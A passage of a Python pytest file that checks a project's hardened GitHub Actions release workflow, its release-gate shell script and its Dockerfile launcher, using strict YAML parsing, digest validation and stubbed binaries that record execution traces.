from __future__ import annotations

import json
import os
import re
import shlex
import signal
import subprocess
from collections.abc import Callable
from pathlib import Path

import pytest

from scripts import check_property_security_posture as property_security_posture
import yaml


ROOT = Path(__file__).resolve().parents[1]
RELEASE_CLIENT = (
    "/usr/libexec/propertyquarry-release-control/"
    "propertyquarry-release-single-host-v2"
)
RELEASE_JOB_NEEDS = [
    "propertyquarry-protected-dispatch-inputs",
    "propertyquarry-ordinary-ci-success",
    "propertyquarry-flagship-security",
    "propertyquarry-security-bootstrap-attestation",
    "propertyquarry-continuous-ux",
]
RELEASE_JOB_CONDITION = (
    "${{ always() && github.event_name == 'workflow_dispatch' "
    "&& github.repository == 'ArchonMegalon/propertyquarry' "
    "&& github.ref == 'refs/heads/main' && inputs.run_launch_authority == true "
    "&& inputs.run_activation_journey != true "
    "&& needs['propertyquarry-protected-dispatch-inputs'].result == 'success' "
    "&& needs['propertyquarry-protected-dispatch-inputs'].outputs.release_runner_label "
    "== inputs.release_runner_label "
    "&& needs['propertyquarry-protected-dispatch-inputs'].outputs."
    "release_runner_ticket_sha256 == inputs.release_runner_ticket_sha256 "
    "&& needs['propertyquarry-ordinary-ci-success'].result == 'success' "
    "&& needs['propertyquarry-flagship-security'].result == 'success' "
    "&& needs['propertyquarry-security-bootstrap-attestation'].result == 'success' "
    "&& needs['propertyquarry-continuous-ux'].result == 'success' }}"
)
RELEASE_JOB_ENV = {
    "BASH_ENV": "/dev/null",
    "ENV": "/dev/null",
    "LD_PRELOAD": "",
    "LD_LIBRARY_PATH": "",
    "LD_AUDIT": "",
    "GCONV_PATH": "",
    "PROPERTYQUARRY_RELEASE_RUNNER_LABEL": (
        "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs."
        "release_runner_label }}"
    ),
    "PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256": (
        "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs."
        "release_runner_ticket_sha256 }}"
    ),
    "PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256": (
        "${{ needs['propertyquarry-security-bootstrap-attestation'].outputs."
        "attestation_sha256 }}"
    ),
    "PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID": (
        "${{ needs['propertyquarry-security-bootstrap-attestation'].outputs."
        "bootstrap_run_id }}"
    ),
    "PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST": (
        "${{ needs['propertyquarry-security-bootstrap-attestation'].outputs."
        "bootstrap_artifact_digest }}"
    ),
}
RELEASE_OPERATIONS = (
    "release-preflight",
    "release-run",
    "ai-panorama-install",
)


class _StrictWorkflowLoader(yaml.SafeLoader):
    """Fail closed on YAML features that can disguise executable structure."""

    def compose_node(self, parent, index):  # type: ignore[no-untyped-def]
        if self.check_event(yaml.AliasEvent):
            raise yaml.constructor.ConstructorError(
                None, None, "workflow aliases are forbidden", self.peek_event().start_mark
            )
        return super().compose_node(parent, index)

    def construct_mapping(self, node, deep=False):  # type: ignore[no-untyped-def]
        if not isinstance(node, yaml.MappingNode):
            raise yaml.constructor.ConstructorError(
                None, None, "expected a workflow mapping", node.start_mark
            )
        mapping = {}
        for key_node, value_node in node.value:
            if key_node.tag == "tag:yaml.org,2002:merge":
                raise yaml.constructor.ConstructorError(
                    None, None, "workflow merge keys are forbidden", key_node.start_mark
                )
            key = self.construct_object(key_node, deep=deep)
            try:
                duplicate = key in mapping
            except TypeError as exc:
                raise yaml.constructor.ConstructorError(
                    None, None, "workflow mapping keys must be scalar", key_node.start_mark
                ) from exc
            if duplicate:
                raise yaml.constructor.ConstructorError(
                    None, None, f"duplicate workflow key: {key!r}", key_node.start_mark
                )
            mapping[key] = self.construct_object(value_node, deep=deep)
        return mapping


def _strict_workflow_document(workflow: str) -> dict[str, object]:
    document = yaml.load(workflow, Loader=_StrictWorkflowLoader)
    assert type(document) is dict
    return document


def _expected_release_client_run(operation: str) -> str:
    assert operation in RELEASE_OPERATIONS
    path_operation = operation
    lines = [
        '[[ "${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256}" =~ ^[0-9a-f]{64}$ ]]',
        '[[ "${PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID}" =~ ^[1-9][0-9]*$ ]]',
        '[[ "${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST}" =~ ^sha256:[0-9a-f]{64}$ ]]',
        '[[ "${PROPERTYQUARRY_RELEASE_RUNNER_LABEL}" =~ ^pqrelease-[0-9a-f]{32}$ ]]',
        '[[ "${PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256}" =~ ^sha256:[0-9a-f]{64}$ ]]',
        '[[ "${GITHUB_RUN_ID}" =~ ^[1-9][0-9]*$ ]]',
        '[[ "${GITHUB_RUN_ATTEMPT}" =~ ^[1-9][0-9]*$ ]]',
        '[[ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]]',
        '[[ "${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" != *$\'\\n\'* ]]',
        '[[ "${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" != *$\'\\r\'* ]]',
        "umask 077",
        (
            f'oidc_fifo="${{RUNNER_TEMP}}/propertyquarry-{path_operation}'
            '-oidc-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.fifo"'
        ),
        (
            f'receipt="${{RUNNER_TEMP}}/propertyquarry-{path_operation}-'
            '${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.receipt.v2.json"'
        ),
        'oidc_writer=""',
        'oidc_writer_pending="0"',
        "cleanup_release_client_step() {",
        "  status=$?",
        "  trap - EXIT HUP INT TERM",
        "  set +e",
        '  writer_pid="${oidc_writer:-}"',
        (
            '  if [[ "${oidc_writer_pending:-0}" == "1" '
            '&& ! "${writer_pid}" =~ ^[1-9][0-9]*$ ]]; then'
        ),
        '    writer_pid="${!:-}"',
        "  fi",
        '  if [[ "${writer_pid}" =~ ^[1-9][0-9]*$ ]]; then',
        '    builtin kill -- "${writer_pid}" 2>/dev/null',
        '    wait "${writer_pid}" 2>/dev/null',
        "  fi",
        "  exec 9<&-",
        '  if [[ -p "${oidc_fifo}" || -L "${oidc_fifo}" ]]; then',
        '    /usr/bin/rm -f -- "${oidc_fifo}"',
        "  fi",
        '  if [[ -f "${receipt}" || -L "${receipt}" ]]; then',
        '    /usr/bin/rm -f -- "${receipt}"',
        "  fi",
        '  exit "${status}"',
        "}",
        "trap cleanup_release_client_step EXIT",
        "trap 'exit 129' HUP",
        "trap 'exit 130' INT",
        "trap 'exit 143' TERM",
        '[[ ! -e "${oidc_fifo}" && ! -L "${oidc_fifo}" ]]',
        '[[ ! -e "${receipt}" && ! -L "${receipt}" ]]',
        '/usr/bin/mkfifo -m 0600 -- "${oidc_fifo}"',
        '[[ -p "${oidc_fifo}" && ! -L "${oidc_fifo}" ]]',
        '[[ "$(/usr/bin/stat -Lc \'%a\' -- "${oidc_fifo}")" == "600" ]]',
        'oidc_writer_pending="1"',
        "(",
        "  builtin printf '%s\\n' \"${ACTIONS_ID_TOKEN_REQUEST_TOKEN}\" >\"${oidc_fifo}\"",
        ") &",
        "oidc_writer=$!",
        'oidc_writer_pending="0"',
        'exec 9<"${oidc_fifo}"',
        'wait "${oidc_writer}"',
        'oidc_writer=""',
        "unset ACTIONS_ID_TOKEN_REQUEST_TOKEN",
        '/usr/bin/rm -f -- "${oidc_fifo}"',
        "set -o noclobber",
        "/usr/bin/env -i \\",
        "  PATH=/usr/sbin:/usr/bin:/sbin:/bin \\",
        "  HOME=/nonexistent \\",
        "  LANG=C \\",
        "  LC_ALL=C \\",
        '  ACTIONS_ID_TOKEN_REQUEST_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}" \\',
        "  PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\",
        '  GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \\',
        '  GITHUB_REF="${GITHUB_REF}" \\',
        '  GITHUB_SHA="${GITHUB_SHA}" \\',
        '  GITHUB_WORKFLOW_REF="${GITHUB_WORKFLOW_REF}" \\',
        '  GITHUB_WORKFLOW_SHA="${GITHUB_WORKFLOW_SHA}" \\',
        '  GITHUB_RUN_ID="${GITHUB_RUN_ID}" \\',
        '  GITHUB_RUN_ATTEMPT="${GITHUB_RUN_ATTEMPT}" \\',
        '  GITHUB_JOB="${GITHUB_JOB}" \\',
        '  PROPERTYQUARRY_RELEASE_RUNNER_LABEL="${PROPERTYQUARRY_RELEASE_RUNNER_LABEL}" \\',
        '  PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256="${PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256}" \\',
        '  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256="${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256}" \\',
        '  PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID="${PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID}" \\',
        '  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST="${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST}" \\',
        f"  {RELEASE_CLIENT} \\",
        f'    client {operation} >"${{receipt}}"',
        "exec 9<&-",
        '[[ -f "${receipt}" && ! -L "${receipt}" && -s "${receipt}" ]]',
        '[[ "$(/usr/bin/stat -Lc \'%a:%h\' -- "${receipt}")" == "600:1" ]]',
        '[[ "$(/usr/bin/wc -l <"${receipt}")" == "1" ]]',
        (
            '[[ "$(/usr/bin/tail -c 1 -- "${receipt}" | /usr/bin/od -An -t u1 '
            '| /usr/bin/tr -d \'[:space:]\')" == "10" ]]'
        ),
        '/usr/bin/rm -f -- "${receipt}"',
        '[[ ! -e "${receipt}" && ! -L "${receipt}" ]]',
    ]
    return "\n".join(lines) + "\n"


def _assert_exact_v2_release_job(workflow: str) -> dict[str, object]:
    document = _strict_workflow_document(workflow)
    assert "env" not in document
    assert "defaults" not in document
    jobs = document.get("jobs")
    assert type(jobs) is dict
    release_job = jobs.get("propertyquarry-release-v2")
    assert type(release_job) is dict
    for job_name, candidate_job in jobs.items():
        assert type(job_name) is str
        assert type(candidate_job) is dict
        if job_name == "propertyquarry-release-v2":
            continue
        runner = candidate_job.get("runs-on")
        runner_labels = runner if type(runner) is list else [runner]
        assert "propertyquarry-release-controller-v2" not in runner_labels
        assert "propertyquarry-release-controller-v2" not in yaml.safe_dump(runner)
        assert RELEASE_CLIENT not in yaml.safe_dump(candidate_job)
    assert set(release_job) == {
        "needs",
        "if",
        "timeout-minutes",
        "concurrency",
        "environment",
        "permissions",
        "runs-on",
        "env",
        "steps",
    }
    assert release_job["needs"] == RELEASE_JOB_NEEDS
    assert release_job["if"] == RELEASE_JOB_CONDITION
    assert type(release_job["timeout-minutes"]) is int
    assert release_job["timeout-minutes"] == 360
    assert release_job["concurrency"] == {
        "group": "propertyquarry-release-lifecycle-v2",
        "cancel-in-progress": False,
    }
    assert release_job["environment"] == {"name": "propertyquarry-production"}
    assert release_job["permissions"] == {"contents": "none", "id-token": "write"}
    assert release_job["runs-on"] == [
        "propertyquarry-release-controller-v2",
        "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs.release_runner_label }}",
    ]
    assert release_job["env"] == RELEASE_JOB_ENV
    steps = release_job["steps"]
    assert type(steps) is list and len(steps) == 3
    expected_steps = (
        (
            "Request non-authorizing release preflight from the installed supervisor",
            "release-preflight",
        ),
        (
            "Request the atomic release lifecycle from the installed supervisor",
            "release-run",
        ),
        (
            "Require signed AI panorama install receipt after runtime deployment",
            "ai-panorama-install",
        ),
    )
    for step, (name, operation) in zip(steps, expected_steps, strict=True):
        assert type(step) is dict
        assert set(step) == {"name", "shell", "run"}
        assert step["name"] == name
        assert step["shell"] == "/bin/bash --noprofile --norc -p -euo pipefail {0}"
        assert step["run"] == _expected_release_client_run(operation)
    return release_job


def _read(path: str) -> str:
    return (ROOT / path).read_text(encoding="utf-8")


def test_smoke_workflow_keeps_runner_temp_expression_at_step_scope() -> None:
    workflow = _strict_workflow_document(
        _read(".github/workflows/smoke-runtime.yml")
    )
    jobs = workflow["jobs"]
    assert type(jobs) is dict
    for job_name, job in jobs.items():
        assert type(job_name) is str
        assert type(job) is dict
        environment = job.get("env", {})
        assert type(environment) is dict
        assert all("${{ runner." not in str(value) for value in environment.values())
    accessibility = jobs["propertyquarry-accessibility-contracts"]
    assert type(accessibility) is dict
    job_environment = accessibility["env"]
    assert type(job_environment) is dict
    assert "EA_PUBLIC_TOUR_DIR" not in job_environment
    steps = accessibility["steps"]
    assert type(steps) is list
    gate = next(
        step
        for step in steps
        if type(step) is dict
        and step.get("name")
        == "Run governed accessibility gate across the provisioned engine matrix"
    )
    assert gate["env"] == {
        "EA_PUBLIC_TOUR_DIR": (
            "${{ runner.temp }}/propertyquarry-accessibility-tours"
        )
    }


def test_property_release_gate_splits_core_and_advanced_visual_claim_scope() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert 'gold_scope="${PROPERTYQUARRY_GOLD_SCOPE:-core}"' in release_gate
    assert 'if [[ "${1:-}" == "--gold-scope" ]]' in release_gate
    assert "core|advanced_visual)" in release_gate
    assert (
        "PROPERTYQUARRY_GOLD_SCOPE/--gold-scope must be core or advanced_visual"
        in release_gate
    )
    assert release_gate.count('--gold-scope "${gold_scope}"') == 2
    assert '--claim-scope "${gold_scope}"' in release_gate
    assert 'if [[ "${gold_scope}" == "advanced_visual" ]]' in release_gate
    assert release_gate.count(
        'if [[ "${gold_scope}" == "advanced_visual" ]]'
    ) >= 5
    assert "advanced_visual_gold_args=()" in release_gate
    assert '"${advanced_visual_gold_args[@]}"' in release_gate
    assert "scripts/propertyquarry_advanced_visual_gold_binding.py" in release_gate
    assert "--advanced-visual-binding-receipt" in release_gate
    assert (
        '\nPYTHONPATH=ea "${PYTHON_BIN}" scripts/property_runtime_reconstruction_smoke.py'
        in release_gate
    )
    assert (
        '\nPYTHONPATH=ea "${PYTHON_BIN}" scripts/propertyquarry_3d_browser_gate.py'
        in release_gate
    )
    assert (
        '\n    PYTHONPATH=ea "${PYTHON_BIN}" scripts/property_scene_video_readiness_report.py'
        in release_gate
    )


@pytest.mark.parametrize(
    "manifest_digest, expected_error",
    [
        ("", "controller-bound runtime-manifest SHA-256"),
        ("A" * 64, "must be an exact lowercase unprefixed 64-hex digest"),
        (
            "sha256:" + "ab" * 32,
            "must be an exact lowercase unprefixed 64-hex digest",
        ),
        ("ab" * 31, "must be an exact lowercase unprefixed 64-hex digest"),
        ("0" * 64, "must be a non-placeholder digest"),
    ],
)
def test_property_release_gate_rejects_untrusted_runtime_manifest_digest(
    manifest_digest: str,
    expected_error: str,
) -> None:
    result = subprocess.run(
        ["/bin/bash", str(ROOT / "scripts/property_release_gates.sh")],
        cwd=ROOT,
        env={
            "PATH": os.environ["PATH"],
            "PROPERTYQUARRY_DR_BACKUP_RECEIPT": "unused-backup.json",
            "PROPERTYQUARRY_DR_RESTORE_RECEIPT": "unused-restore.json",
            "PROPERTYQUARRY_RELEASE_COMMIT_SHA": "1" * 40,
            "PROPERTYQUARRY_RELEASE_IMAGE_DIGEST": "sha256:" + "2" * 64,
            "PROPERTYQUARRY_EXPECTED_RELEASE_DEPLOYMENT_ID": "release-test",
            "PROPERTYQUARRY_EXPECTED_RELEASE_MANIFEST_SHA256": manifest_digest,
            "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_PATH": (
                "/usr/bin/chromium"
            ),
            "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_SHA256": (
                "abcdef0123456789" * 4
            ),
        },
        text=True,
        capture_output=True,
        timeout=10,
        check=False,
    )

    assert result.returncode == 2
    assert expected_error in result.stderr


def test_property_release_gate_execution_trace_never_touches_advanced_state_in_core(
    tmp_path: Path,
) -> None:
    stub_dir = tmp_path / "bin"
    stub_dir.mkdir()
    trace_path = tmp_path / "release-gate.trace"
    shared_env_path = tmp_path / "scene-video-shared.env"
    shared_env_path.write_text("PROVIDER_ACCOUNT_PLACEHOLDER=bound\n", encoding="utf-8")
    receipt_path = tmp_path / "required-receipt.json"
    receipt_path.write_text("{}\n", encoding="utf-8")
    mixed_drop_root = tmp_path / "MAGICFIT-OMAGIC-MIXED-DROP-SENTINEL"
    forbidden_advanced_commands = (
        "discover_property_tour_exports.py",
        "materialize_property_tour_export_manifest.py",
        "verify_property_tour_vendor_tooling.py",
        "property_scene_video_shared_env.py",
        "merge_scene_video_provider_accounts_env.py",
        "property_scene_video_readiness_report.py",
        "verify_property_scene_video_readiness.py",
        "property_scene_video_runtime_status.py",
        "materialize_scene_video_provider_refresh_packet.py",
        "verify_scene_video_provider_refresh_packet.py",
        "propertyquarry_notify_scene_video_provider_refresh.py",
        "propertyquarry_walkthrough_provider_proof_gate.py",
        "propertyquarry_walkthrough_quality_gate.py",
        "propertyquarry_advanced_visual_gold_binding.py",
    )
    python_stub = stub_dir / "python-stub"
    python_stub.write_text(
        "#!/bin/sh\n"
        "printf 'python\\t%s\\n' \"$*\" >> \"$PQ_RELEASE_TRACE\"\n"
        "if [ \"$PQ_RELEASE_SCOPE\" = core ]; then\n"
        + "".join(
            f"  case \"$*\" in *{token}*) exit 97 ;; esac\n"
            for token in forbidden_advanced_commands
        )
        + "fi\n"
        "exit 0\n",
        encoding="utf-8",
    )
    python_stub.chmod(0o700)
    docker_stub = stub_dir / "docker"
    docker_stub.write_text(
        "#!/bin/sh\n"
        "printf 'docker\\t%s\\n' \"$*\" >> \"$PQ_RELEASE_TRACE\"\n"
        "if [ \"$PQ_RELEASE_SCOPE\" = core ]; then\n"
        "  case \"$*\" in *discover_property_tour_exports.py*|*materialize_property_tour_export_manifest.py*|*verify_property_tour_vendor_tooling.py*|*property_scene_video*|*scene-video*|*property_scene_video_shared.env*) exit 98 ;; esac\n"
        "fi\n"
        "exit 0\n",
        encoding="utf-8",
    )
    docker_stub.chmod(0o700)
    bash_stub = stub_dir / "bash"
    bash_stub.write_text(
        "#!/bin/sh\n"
        "printf 'bash\\t%s\\n' \"$*\" >> \"$PQ_RELEASE_TRACE\"\n"
        "exit 0\n",
        encoding="utf-8",
    )
    bash_stub.chmod(0o700)
    release_gate_under_test = tmp_path / "property_release_gates.sh"
    release_gate_source = _read("scripts/property_release_gates.sh")
    release_gate_source = release_gate_source.replace(
        "PATH=/usr/sbin:/usr/bin:/sbin:/bin",
        f"PATH={stub_dir}:/usr/sbin:/usr/bin:/sbin:/bin",
        1,
    ).replace(
        'EA_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"',
        f'EA_ROOT="{ROOT}"',
        1,
    )
    release_gate_under_test.write_text(release_gate_source, encoding="utf-8")
    release_gate_under_test.chmod(0o700)

    base_env = {
        **os.environ,
        "PATH": f"{stub_dir}:{os.environ['PATH']}",
        "PYTHON_BIN": str(python_stub),
        "PQ_RELEASE_TRACE": str(trace_path),
        "PROPERTYQUARRY_DR_BACKUP_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_DR_RESTORE_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_RELEASE_COMMIT_SHA": "1" * 40,
        "PROPERTYQUARRY_RELEASE_IMAGE_DIGEST": "sha256:" + "2" * 64,
        "PROPERTYQUARRY_EXPECTED_RELEASE_COMMIT_SHA": "1" * 40,
        "PROPERTYQUARRY_EXPECTED_RELEASE_REPOSITORY": "owner/property",
        "PROPERTYQUARRY_EXPECTED_RELEASE_PUBLIC_ORIGIN": (
            "https://propertyquarry.invalid"
        ),
        "PROPERTYQUARRY_EXPECTED_RELEASE_BRANCH": "main",
        "PROPERTYQUARRY_EXPECTED_RELEASE_DEPLOYMENT_ID": "propertyquarry-test-deploy",
        "PROPERTYQUARRY_EXPECTED_RELEASE_ARTIFACT_SET": "global-core",
        "PROPERTYQUARRY_EXPECTED_RELEASE_LABEL": "flagship-test",
        "PROPERTYQUARRY_EXPECTED_RELEASE_GENERATED_AT": "2026-07-19T12:00:00Z",
        "PROPERTYQUARRY_EXPECTED_RELEASE_IMAGE_DIGEST": "sha256:" + "2" * 64,
        "PROPERTYQUARRY_EXPECTED_REPLICA_ID": "propertyquarry-web-1",
        "PROPERTYQUARRY_EXPECTED_WEB_IMAGE": "web@sha256:" + "8" * 64,
        "PROPERTYQUARRY_EXPECTED_RENDER_IMAGE": "render@sha256:" + "9" * 64,
        "PROPERTYQUARRY_EXPECTED_RELEASE_MANIFEST_SHA256": (
            "0123456789abcdef" * 4
        ),
        "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_PATH": (
            "/usr/bin/chromium"
        ),
        "PROPERTYQUARRY_EXPECTED_PERFORMANCE_CHROMIUM_EXECUTABLE_SHA256": (
            "abcdef0123456789" * 4
        ),
        "PROPERTYQUARRY_SLO_METRICS_SNAPSHOT": str(receipt_path),
        "PROPERTYQUARRY_SLO_METRICS_PROBE_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_MONITORING_RUNTIME_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_PROMETHEUS_RANGE_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_PROMETHEUS_RANGE_RESPONSE": str(receipt_path),
        "PROPERTYQUARRY_ALERT_DELIVERY_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_CONTINUOUS_UX_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_FAILURE_STATE_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_ACTIVATION_TO_VALUE_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_PROVIDER_CATALOG_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_EVIDENCE_OVERLAY_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_RYBBIT_EVIDENCE_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_PUBLIC_ORIGIN": "https://propertyquarry.invalid",
        "PROPERTYQUARRY_PERFORMANCE_TARGET_URL": (
            "https://propertyquarry.invalid/app/search"
        ),
        "PROPERTYQUARRY_LIVE_PROBE_SECRET": "test-release-probe-secret-32-bytes-minimum",
        "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL": "https://propertyquarry.invalid",
        "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE": (
            "/app/research/perf-candidate-1020?run_id=run-gold-mobile"
        ),
        "PROPERTYQUARRY_LIVE_PRINCIPAL_ID": "pq-live-mobile-smoke",
        "PROPERTYQUARRY_ACCESSIBILITY_PUBLIC_TOUR_ROUTE": (
            "/tours/flagship-proof"
        ),
        "PROPERTYQUARRY_RELEASE_SECURITY_RECEIPT": str(receipt_path),
        "PROPERTYQUARRY_RELEASE_SECURITY_WORKFLOW_BINDING": str(receipt_path),
        "PROPERTYQUARRY_WORKFLOW_HEAD_SHA": "1" * 40,
        "PROPERTYQUARRY_WORKFLOW_RUN_ID": "12345",
        "PROPERTYQUARRY_WORKFLOW_RUN_ATTEMPT": "1",
        "DATABASE_URL": "postgresql://property:test@db.invalid/property",
        "TEABLE_BASE_URL": "https://teable.invalid",
        "TEABLE_API_KEY": "test-teable-key",
        "PROPERTYQUARRY_EVIDENCE_OVERLAY_TEABLE_BASE_ID": "base-a",
        "PROPERTYQUARRY_EXPECTED_TEABLE_ORIGIN": "https://teable.invalid",
        "PROPERTYQUARRY_EXPECTED_TEABLE_BASE_ID_SHA256": "3" * 64,
        "PROPERTYQUARRY_RYBBIT_ORIGIN": "https://rybbit.invalid",
        "PROPERTYQUARRY_RYBBIT_SITE_ID": "site-a",
        "PROPERTYQUARRY_RYBBIT_SITE_ID_SHA256": "4" * 64,
        "PROPERTYQUARRY_RYBBIT_API_KEY": "test-rybbit-key",
        "PROPERTYQUARRY_RYBBIT_SITE_API_URL": "https://rybbit.invalid/site",
        "PROPERTYQUARRY_RYBBIT_HAS_DATA_API_URL": (
            "https://rybbit.invalid/has-data"
        ),
        "PROPERTYQUARRY_RYBBIT_EVENTS_API_URL": (
            "https://rybbit.invalid/events"
        ),
        "PROPERTYQUARRY_LIVE_TELEGRAM_BOT_TOKEN": "test-telegram-token",
        "PROPERTYQUARRY_LIVE_TELEGRAM_CHAT_ID": "test-chat",
        "PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_FILE": str(shared_env_path),
        "PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_RUNTIME_FILE": (
            "/run/propertyquarry/advanced-scene-video.env"
        ),
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED": "1",
        "PROPERTYQUARRY_TOUR_EXPORT_INCOMING_DIR": str(mixed_drop_root),
        "PROPERTYQUARRY_TOUR_EXPORT_DROP_DIR": str(mixed_drop_root),
        "PROPERTYQUARRY_GOLD_NOTIFICATION_ENABLED": "0",
    }

    traces: dict[str, str] = {}
    for scope in ("core", "advanced_visual"):
        trace_path.write_text("", encoding="utf-8")
        result = subprocess.run(
            [
                str(release_gate_under_test),
                "--gold-scope",
                scope,
            ],
            cwd=ROOT,
            env={**base_env, "PQ_RELEASE_SCOPE": scope},
            text=True,
            capture_output=True,
            timeout=30,
            check=False,
        )
        assert result.returncode == 0, (scope, result.stdout, result.stderr)
        traces[scope] = trace_path.read_text(encoding="utf-8")
        if scope == "core":
            assert not mixed_drop_root.exists()

    core_trace = traces["core"]
    advanced_trace = traces["advanced_visual"]
    assert core_trace.count(
        "--expected-release-manifest-sha256 " + "0123456789abcdef" * 4
    ) == 2
    for token in forbidden_advanced_commands:
        assert token not in core_trace
    assert "property_scene_video_shared.env" not in core_trace
    assert str(mixed_drop_root) not in core_trace
    for token in forbidden_advanced_commands:
        if token == "merge_scene_video_provider_accounts_env.py":
            continue
        assert token in advanced_trace
    assert "/run/propertyquarry/advanced-scene-video.env" in advanced_trace
    assert str(mixed_drop_root) in advanced_trace
    assert not list(tmp_path.rglob("README.propertyquarry-export.txt"))
    assert not any(
        path.name.lower() in {"magicfit", "omagic"}
        for path in tmp_path.rglob("*")
        if path.is_dir()
    )


def _security_posture_failures_with_file_mutation(
    monkeypatch: pytest.MonkeyPatch,
    *,
    path: str,
    mutate: Callable[[str], str],
) -> list[str]:
    read = property_security_posture._read
    mutated = False

    def read_with_mutation(candidate: str) -> str:
        nonlocal mutated
        value = read(candidate)
        if candidate == path:
            mutated = True
            return mutate(value)
        return value

    monkeypatch.setattr(property_security_posture, "_read", read_with_mutation)
    receipt = property_security_posture.build_security_posture_receipt()
    assert mutated is True
    return list(receipt["failures"])


def test_property_render_runtime_uses_static_loader_environment_launcher() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    launcher = _read("ea/property_render_env_launcher.c")

    assert "ea/property_render_env_launcher.c" in dockerfile
    assert "cc -static -Os -s -Wall -Wextra -Werror" in dockerfile
    assert "readelf -lW /out/propertyquarry/property-render-env-launcher" in dockerfile
    assert (
        "> /out/propertyquarry/property-render-env-launcher.readelf"
        in dockerfile
    )
    assert (
        "test -s /out/propertyquarry/property-render-env-launcher.readelf"
        in dockerfile
    )
    assert (
        "'$1 == \"INTERP\" { found = 1 } END { exit found ? 1 : 0 }'"
        in dockerfile
    )
    assert (
        "COPY --from=codec-builder --chmod=0555 \\\n"
        "    /out/propertyquarry/property-render-env-launcher \\\n"
        "    /usr/local/bin/property-render-env-launcher"
    ) in dockerfile
    assert (
        'ENTRYPOINT ["/usr/local/bin/property-render-env-launcher", '
        '"/usr/local/bin/python", "-I", "-S", '
        '"/usr/local/libexec/property_render_entrypoint.py"]'
    ) in dockerfile
    assert (
        'CMD ["/usr/local/bin/property-render-env-launcher", '
        '"/usr/local/bin/python", "-I", "-S", "-c"'
    ) in dockerfile

    assert 'memcmp(entry, "LD_", 3U) == 0' in launcher
    assert 'static const char glibc_tunables[] = "GLIBC_TUNABLES";' in launcher
    assert 'static const char gconv_path[] = "GCONV_PATH";' in launcher
    assert "*destination = NULL;" in launcher
    assert "execv(argv[1], &argv[1]);" in launcher
    assert "perror(" not in launcher
    assert "strerror(" not in launcher
    assert 'static const char message[] = "property-render-launcher: failed\\n";' in launcher


def _assert_external_deploy_controller_handoff(script: str) -> None:
    for required in (
        "/usr/libexec/propertyquarry-release-control/propertyquarry-deploy-controller",
        "/etc/propertyquarry/release-control/external-deploy-controller.v1.json",
        "--controller-self-fd",
        "--external-manifest-fd",
        "--signed-request-fd",
        "--candidate-root-fd",
        "--controller-owns-all-privileged-actions",
        "--contain-before-candidate-validation",
        "--forbid-caller-compose",
        "--forbid-candidate-output-authority",
        "/usr/bin/env -i",
    ):
        assert required in script
    for forbidden in (
        "propertyquarry_deploy_controller_guard.py",
        "docker compose",
        "docker-compose",
        "psql",
        "PROPERTYQUARRY_DEPLOY_PYTHON_BIN",
    ):
        assert forbidden not in script


def _workflow_job(workflow: str, job_name: str) -> str:
    marker = f"  {job_name}:\n"
    start = workflow.index(marker)
    body_start = start + len(marker)
    next_job = re.search(r"^  [a-zA-Z0-9_-]+:\n", workflow[body_start:], flags=re.MULTILINE)
    end = body_start + next_job.start() if next_job else len(workflow)
    return workflow[start:end]


def _run_schema_quiesce_scenario(
    tmp_path: Path,
    *,
    scenario: str,
    api_state: str,
    worker_state: str,
    scheduler_state: str,
) -> tuple[subprocess.CompletedProcess[str], list[str]]:
    event_log = tmp_path / "events.log"
    shell = r'''
set -euo pipefail

declare -A SERVICE_STATE=(
  [api]="${INITIAL_API_STATE}"
  [worker]="${INITIAL_WORKER_STATE}"
  [scheduler]="${INITIAL_SCHEDULER_STATE}"
  [render]="stopped"
  [migrate]="stopped"
